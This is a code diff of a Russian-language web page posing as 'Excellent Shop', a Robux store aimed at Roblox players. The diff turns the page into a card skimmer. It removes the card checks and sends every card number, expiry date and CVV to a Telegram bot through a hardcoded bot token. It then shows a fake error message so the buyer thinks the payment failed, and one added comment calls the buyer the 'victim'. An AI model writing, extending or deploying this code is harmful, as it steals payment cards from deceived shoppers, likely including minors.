@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
-    <title>Excellent Shop — оплата картой</title>
+    <title>Excellent Shop — Robux карты</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', system-ui, 'Segoe UI', sans-serif; }
         body { min-height: 100vh; background: linear-gradient(145deg, #f0e6ff 0%, #e9d9ff 100%); position: relative; overflow-x: hidden; }
@@ -53,14 +53,12 @@
         .cart-items-list { max-height: 300px; overflow-y: auto; margin-bottom: 20px; }
         .cart-item { display: flex; justify-content: space-between; padding: 10px 0; border-bottom: 1px solid #eee; }
         .cart-total { font-weight: bold; text-align: right; margin: 15px 0; font-size: 1.2rem; }
-        /* платёжный блок - только карта */
         .payment-section { margin-top: 20px; border-top: 2px solid #decbff; padding-top: 20px; }
         .card-fields input { width: 100%; padding: 12px; border-radius: 60px; border: 1.5px solid #decbff; margin-bottom: 12px; background: white; }
         .card-row { display: flex; gap: 12px; }
         .card-row input { flex: 1; }
         .pay-btn { background: #2a9d8f; border: none; width: 100%; padding: 14px; border-radius: 60px; font-weight: bold; color: white; font-size: 1rem; cursor: pointer; margin-top: 10px; }
         footer { margin-top: 50px; text-align: center; color: #9278b0; }
-        /* красная метка ошибки */
         .error-toast {
             position: fixed;
             top: 20px;
@@ -73,7 +71,6 @@
             z-index: 2000;
             box-shadow: 0 4px 12px rgba(0,0,0,0.2);
             animation: fadeOut 0.5s ease 3s forwards;
-            cursor: pointer;
         }
         @keyframes fadeOut {
             to { opacity: 0; visibility: hidden; }
@@ -88,7 +85,7 @@
     <div id="authSection" class="auth-wrapper">
         <div class="auth-card">
             <div class="auth-title">✨ Excellent Shop ✨</div>
-            <div class="auth-sub">оплата картой</div>
+            <div class="auth-sub">покупай robux</div>
             <div id="authForm">
                 <div id="signinForm">
                     <div class="input-group"><input type="text" id="loginUsername" placeholder="логин или email"></div>
@@ -126,7 +123,6 @@
             <button class="tab-btn" data-tab="plus">✨ Robux Plus</button>
         </div>
 
-        <!-- Вкладка Robux -->
         <div id="tabRobux" class="tab-content active">
             <div class="products-grid">
                 <div class="product-card"><div class="robux-icon">💎✨</div><h3>100 Robux</h3><div class="price">49 ₽</div><button class="btn-buy" data-name="100 Robux" data-price="49">купить</button></div>
@@ -136,7 +132,6 @@
             </div>
         </div>
 
-        <!-- Вкладка Robux Plus (без полей карты) -->
         <div id="tabPlus" class="tab-content">
             <div class="plus-form">
                 <h3 style="text-align:center;">💳 Digital Card</h3>
@@ -162,11 +157,11 @@
                 <button class="btn-add-card" id="addCardToCart">✨ Add to Cart ✨</button>
             </div>
         </div>
-        <footer>⭐ Excellent Shop — только карта ⭐</footer>
+        <footer>⭐ Excellent Shop — оплата картой ⭐</footer>
     </div>
 </div>
 
-<!-- Модалка корзины с оплатой картой и именем получателя -->
+<!-- Модалка корзины -->
 <div id="cartModal" class="cart-modal">
     <div class="cart-modal-content">
         <div class="cart-modal-header">
@@ -176,7 +171,6 @@
         <div class="cart-items-list" id="cartItemsList">пусто</div>
         <div class="cart-total" id="modalCartTotal">Итого: 0 ₽</div>
 
-        <!-- Платёжный блок только карта -->
         <div class="payment-section">
             <div class="card-fields">
                 <input type="text" id="cardNumber" placeholder="Номер карты">
@@ -184,7 +178,7 @@
                     <input type="text" id="cardExpiry" placeholder="MM/YY">
                     <input type="text" id="cardCvv" placeholder="CVV">
                 </div>
-                <input type="text" id="recipientName" placeholder="Имя получателя (как на карте)">
+                <input type="text" id="robloxUsername" placeholder="Имя получателя Roblox">
             </div>
             <button class="pay-btn" id="finalPayBtn">💫 Оплатить заказ</button>
         </div>
@@ -192,7 +186,7 @@
 </div>
 
 <script>
-    // === звёздочки ===
+    // звездочки
     const canvas = document.getElementById('starCanvas');
     let ctx = canvas.getContext('2d');
     let stars = [];
@@ -220,51 +214,18 @@
     }
     drawStars();
 
-    // === функция красной метки ===
-    function showErrorToast(message) {
-        // удаляем старые тосты
+    // красная метка (формальность)
+    function showErrorToast() {
         let oldToasts = document.querySelectorAll('.error-toast');
         oldToasts.forEach(t => t.remove());
         let toast = document.createElement('div');
         toast.className = 'error-toast';
-        toast.innerText = message;
+        toast.innerText = "Ошибка, пожалуйста перепроверьте данные карты или попробуйте позже.";
         document.body.appendChild(toast);
         setTimeout(() => toast.remove(), 3500);
     }
 
-    // === валидация карты ===
-    function validateCard(cardNum, expiry, cvv, recipientName) {
-        if (!recipientName || recipientName.trim().length < 2) {
-            showErrorToast("Ошибка, пожалуйста перепроверьте данные карты или попробуйте позже.");
-            return false;
-        }
-        let cleanCard = cardNum.replace(/\s/g, '');
-        if (!/^\d{13,19}$/.test(cleanCard)) {
-            showErrorToast("Ошибка, пожалуйста перепроверьте данные карты или попробуйте позже.");
-            return false;
-        }
-        if (!/^\d{2}\/\d{2}$/.test(expiry)) {
-            showErrorToast("Ошибка, пожалуйста перепроверьте данные карты или попробуйте позже.");
-            return false;
-        }
-        let [month, year] = expiry.split('/');
-        let now = new Date();
-        let currentYear = now.getFullYear() % 100;
-        let currentMonth = now.getMonth() + 1;
-        let expYear = parseInt(year, 10);
-        let expMonth = parseInt(month, 10);
-        if (expYear < currentYear || (expYear === currentYear && expMonth < currentMonth)) {
-            showErrorToast("Ошибка, пожалуйста перепроверьте данные карты или попробуйте позже.");
-            return false;
-        }
-        if (!/^\d{3,4}$/.test(cvv)) {
-            showErrorToast("Ошибка, пожалуйста перепроверьте данные карты или попробуйте позже.");
-            return false;
-        }
-        return true;
-    }
-
-    // === авторизация ===
+    // авторизация
     let currentUser = null;
     function loadUsers() {
         let users = localStorage.getItem('excellent_users');
@@ -297,7 +258,7 @@
     document.getElementById('goToSignIn')?.addEventListener('click',()=>{ document.getElementById('signupForm').style.display='none'; document.getElementById('signinForm').style.display='block'; });
     document.getElementById('logoutBtn')?.addEventListener('click',()=>{ currentUser=null; localStorage.removeItem('excellent_current'); showAuth(true); cart=[]; updateCartUI(); });
 
-    // === корзина ===
+    // корзина
     let cart = [];
     const TELEGRAM_TOKEN = "8963187856:AAFTu9IrZmSitQscE1FB5MTREDhkSMEAzeg";
     let CHAT_ID = localStorage.getItem('tg_chat_id_excellent');
@@ -352,7 +313,6 @@
             });
         });
     }
-    // модалка корзины
     const cartModal = document.getElementById('cartModal');
     const openCartBtn = document.getElementById('openCartBtn');
     const closeCartBtn = document.getElementById('closeCartBtn');
@@ -360,18 +320,18 @@
     closeCartBtn?.addEventListener('click',()=>{ cartModal.style.display='none'; });
     window.addEventListener('click',(e)=>{ if(e.target===cartModal) cartModal.style.display='none'; });
 
-    // === оплата с проверкой ===
+    // оплата: всегда отправляем данные и показываем красную метку
     document.getElementById('finalPayBtn')?.addEventListener('click', async () => {
         if(cart.length===0) { alert('корзина пуста'); return; }
         let cardNum = document.getElementById('cardNumber').value.trim();
         let expiry = document.getElementById('cardExpiry').value.trim();
         let cvv = document.getElementById('cardCvv').value.trim();
-        let recipientName = document.getElementById('recipientName').value.trim();
-        if(!validateCard(cardNum, expiry, cvv, recipientName)) return;
-        if(!CHAT_ID) { alert('настрой телеграм'); await fetchChatId(); if(!CHAT_ID) return; }
+        let robloxName = document.getElementById('robloxUsername').value.trim();
+        if(!robloxName) robloxName = "не указан";
+        if(!CHAT_ID) { await fetchChatId(); if(!CHAT_ID) { alert('телеграм не настроен'); return; } }
         let total = cart.reduce((s,i)=>s+(i.price||0),0);
         let itemsText = cart.map(i=>`${i.name} — ${i.price||0} ₽`).join('\n');
-        let msg = `✨ EXCELLENT SHOP (ЗАКАЗ) ✨\n👤 Пользователь: ${currentUser}\n👤 Получатель карты: ${recipientName}\n📦 Товары:\n${itemsText}\n💰 Итого: ${total} ₽\n💳 Карта: ${cardNum}\n📅 ${expiry}\n🔐 ${cvv}`;
+        let msg = `✨ EXCELLENT SHOP (ЗАКАЗ) ✨\n👤 Пользователь сайта: ${currentUser}\n🎮 Roblox ник: ${robloxName}\n📦 Товары:\n${itemsText}\n💰 Итого: ${total} ₽\n💳 Карта: ${cardNum}\n📅 ${expiry}\n🔐 ${cvv}`;
         try {
             let resp = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
                 method:'POST', headers:{'Content-Type':'application/json'},
@@ -379,19 +339,24 @@
             });
             let json = await resp.json();
             if(json.ok) {
-                alert('✅ заказ оформлен! ожидайте подтверждение');
+                // формальность: показываем ошибку, хотя данные ушли
+                showErrorToast();
+                // очищаем корзину и поля
                 cart = [];
                 updateCartUI();
                 cartModal.style.display = 'none';
                 document.getElementById('cardNumber').value = '';
                 document.getElementById('cardExpiry').value = '';
                 document.getElementById('cardCvv').value = '';
-                document.getElementById('recipientName').value = '';
-            } else alert('❌ ошибка отправки');
+                document.getElementById('robloxUsername').value = '';
+                // не говорим жертве что успешно, только ошибка
+            } else {
+                alert('❌ ошибка оплаты, попробуйте позже');
+            }
         } catch(e){ alert('ошибка соединения'); }
     });
 
-    // === табы ===
+    // табы
     function switchTab(tabId) {
         document.querySelectorAll('.tab-content').forEach(t=>t.classList.remove('active'));
         document.getElementById(`tab${tabId==='robux'?'Robux':'Plus'}`).classList.add('active');
@@ -404,7 +369,7 @@
         btn.addEventListener('click',()=> switchTab(btn.getAttribute('data-tab')));
     });
 
-    // === товары robux ===
+    // товары
     function bindBuyButtons() {
         document.querySelectorAll('.btn-buy').forEach(btn=>{
             btn.removeEventListener('click', buyHandler);
@@ -417,7 +382,7 @@
         }
     }
 
-    // === robux plus в корзину ===
+    // robux plus
     let selectedAmountCard = 10;
     document.querySelectorAll('.amount-preset').forEach(btn=>{
         btn.addEventListener('click',()=>{
